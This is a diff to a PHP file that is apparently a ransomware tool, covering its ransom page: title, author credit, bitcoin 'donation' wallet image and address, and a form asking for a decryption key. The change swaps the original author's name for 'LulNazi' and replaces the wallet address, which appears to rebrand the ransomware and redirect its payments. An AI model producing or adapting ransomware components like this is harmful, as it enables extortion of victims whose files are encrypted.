@@ -207,14 +207,14 @@ if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) 
 		<div class="front-form">
 			<div class="layout">
 				<header>
-					<h1 class="title">Ransomware</h1>
+					<h1 class="title">Ransomware!</h1>
 				</header>
 				<div class="about">
-					<p>Made by Ivan Šincek.</p>
+					<p>Made by LulNazi.</p>
 					<p>I hope you like it!</p>
 					<p>Feel free to donate bitcoin.</p>
 					<img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAJYAAACWCAIAAACzY+a1AAAABmJLR0QA/wD/AP+gvaeTAAADYklEQVR4nO2dy27jMAwAnUX//5fTwxY5CI4ghaTkcWYuC2z8agdEWImkH8/n8xAy/3Y/gET5+f/P4/FYc7+poG+eqjl32ad9IudGeN3XKMSjQjwqxKNCPD+n/5v4l0b/672fVvSpy4wiN0o8t+HdQxqFeFSIR4V4VIjnPJ1piKxWRA7uf9rPUCKP0Vw5Mdmp+E0ahXhUiEeFeFSIZyidqSPx630q6YhkKMu2kwYxCvGoEI8K8agQz+Z0ZqqkpX9uA6L+JQWjEI8K8agQjwrxDKUzdUX7U4nD1JJKYoaS+ONX/CaNQjwqxKNCPCrEc57O7FqeSOw/Suxdmrpy/+AKjEI8KsSjQjwqxPO41LiEulKayK7WxTEK8agQjwrxqBBP/tyZul2exOWYXWNoEj99YRTiUSEeFeJRIZ6h1Zllncq7BuVF+p7qJtoMnmsU4lEhHhXiUSGeT0qBp1ZJ6lhWSjPVYJVYWePcmW9BhXhUiEeFeIY2mxIn4y2rjpm6b+IYvcQRwm42fQsqxKNCPCrE85fO1DX+JJ6buKu1a88rcqN3GIV4VIhHhXhUiOevdmZBicfIwVP33fUYdS3gn93XKMSjQjwqxKNCPOfpzLIv8GXD7q7Zt23tjByHCm+ACvGoEE/5GL26upvImlHdDlHiwYMYhXhUiEeFeFSIZ6h2JrJaUbcH1L9RZKOqLquqqJM2CvGoEI8K8agQz3lnE2IPaNfsuwgVVzYK8agQjwrxqBBPQu1Me8WC/ZQ4dT9g4tKVm01figrxqBCPCvEMjdFrmPoSvsg43sRP63K9qYPdbLoPKsSjQjwqxJM/FbhhWdPQsr2nqcdIvJFj9G6LCvGoEI8K8Wx+o3Zd/3Ti/tGy4X5TuDpzH1SIR4V4VIgn/43afRK7qxOvvKvByqnAchwqvAEqxKNCPOebTXW9PP0bJc4M3jXrr+6dTe8ONgrxqBCPCvGoEM9Q7cyyNxMk1tE21DUr7Xq/1QujEI8K8agQjwrxfNLZVEekpaghcUll2VvAP8tujEI8KsSjQjwqxHOtdKYhkt0s2xJqqKtCsrPptqgQjwrxqBDPJ43ay6ir7o0U7PZZ3yBuFOJRIR4V4lEhnvJXUC5j17CY/qUWLCEZhXhUiEeFeFSIZ/PcGYljFOJRIZ5fegtTUAXpVhUAAAAASUVORK5CYII=" alt="Bitcoin Wallet">
-					<p>1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14</p>
+					<p>19B4fMjXU1xZpxsV2MLuVPQ6TSZeNbQRRA</p>
 				</div>
 				<form method="post" action="<?php echo './' . pathinfo($_SERVER['SCRIPT_FILENAME'], PATHINFO_BASENAME); ?>">
 					<label for="key">Decryption Key</label>
